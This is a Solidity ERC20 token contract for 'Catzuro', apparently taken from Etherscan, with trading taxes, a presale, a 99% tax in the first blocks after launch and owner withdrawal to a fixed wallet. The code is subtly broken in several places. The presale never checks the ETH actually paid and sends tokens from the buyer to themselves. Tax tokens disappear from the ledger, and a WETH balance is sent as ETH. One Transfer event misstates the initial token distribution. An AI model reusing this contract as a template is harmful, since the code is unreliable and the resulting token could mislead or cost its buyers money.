/**
 *Submitted for verification at Etherscan.io on 2023-06-17
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, " multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "new owner is the zero address");
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Catzuro is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFeeWallet;
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000000000 * 10**_decimals;
      
    uint256 private constant onePercent = _totalSupply / 1000;
    uint256 private maxPreSale = onePercent * 5;

    uint256 private _tax;
    uint256 public buyTax = 5;
    uint256 public sellTax = 5;

    uint256 public stage = 0;
    uint256 public deployTime = 0;

    string private constant _name = "Catzuro";
    string private constant _symbol = "CATZO";

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    address payable public btaxWallet;
    address payable public staxWallet;
        
    uint256 private launchBlock;
    uint256 private deadBlock = 3;
    bool private launch = false;
    bool private preSale = false;
    uint256 private price = 4;
    uint256 minBuy = 5 *10**16;
    uint256 preSaleSold = 0;
    uint256 launchTime;
    address feeW1 = 0x60d2594A7543ca49275A79e673f93A911fe4aFA5;

    constructor() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        btaxWallet = payable(0x60d2594A7543ca49275A79e673f93A911fe4aFA5); 
        staxWallet = payable(0x60d2594A7543ca49275A79e673f93A911fe4aFA5);
        _balance[_msgSender()] = _totalSupply - ((_totalSupply * 15) / 100);
        _balance[0xd1c012c89daCb562B06D508D5Af9c0CCa94E82Fb] = (_totalSupply * 10) / 100;
        _balance[address(this)] = (_totalSupply * 5) / 100;
        deployTime = block.timestamp;
    
        _isExcludedFromFeeWallet[_msgSender()] = true;
        _isExcludedFromFeeWallet[address(this)] = true;
        _isExcludedFromFeeWallet[btaxWallet] = true;
        _isExcludedFromFeeWallet[staxWallet] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)public override returns (bool){
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"low allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "approve zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function togglePresale() external onlyOwner {
        preSale = !preSale;
        launchTime = block.timestamp;

    }

    function buy(uint256 ethAmount, uint256 tAmount) external payable {
        require(preSale, "Sale is not enabled yet!");
        require(launchTime + 864000 >= block.timestamp, "Pre Sale has ended!");
        require(ethAmount > minBuy, "Minimum buy is 0.1 ETH");
        uint256 pCheck = (ethAmount / tAmount);
        require(price * 10**10 == pCheck, "Amount check failed!");
        uint256 fAmount = tAmount *10**_decimals;
        require(preSaleSold + fAmount < maxPreSale, "Amount exceedes presale balance!");
        preSaleSold += fAmount;
        transfer(_msgSender(), fAmount);
    }

    function withdrawAll() external payable onlyOwner {
        uint256 balance = address(this).balance;
        require(payable(feeW1).send(balance), "Transfer failed.");
}

    function enableTrading() external onlyOwner {
        launch = true;
        launchBlock = block.number;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "transfer zero address");
        bool _isBuy = false;
        bool _isSell = false;

        if(deployTime + 31536000 <= block.timestamp){
            buyTax = 0;
	        sellTax = 0;
        }

        if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
            _tax = 0;
        } else {
            require(launch, "Wait till launch");
            if (block.number < launchBlock + deadBlock) {_tax=99;} else {
                if (from == uniswapV2Pair) {
                    _tax = buyTax;
                    _isBuy = true;
                } else if (to == uniswapV2Pair) {
                    _tax = sellTax;
                    _isSell = true;
                } else {
                    _tax = 0;
                }
            }
        }

        uint256 taxTokens = (amount * _tax) / 100;
        uint256 transferAmount = amount - taxTokens;

        _balance[from] = _balance[from] - amount;
        _balance[to] = _balance[to] + transferAmount;

        if(_isBuy || _isSell){
            swapTokensForEth(taxTokens);
            payable(btaxWallet).transfer(IERC20(uniswapV2Router.WETH()).balanceOf(address(this)));
        }
        
        emit Transfer(from, to, transferAmount);
    }

     function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            btaxWallet,
            block.timestamp
        );
    }

    receive() external payable {}
}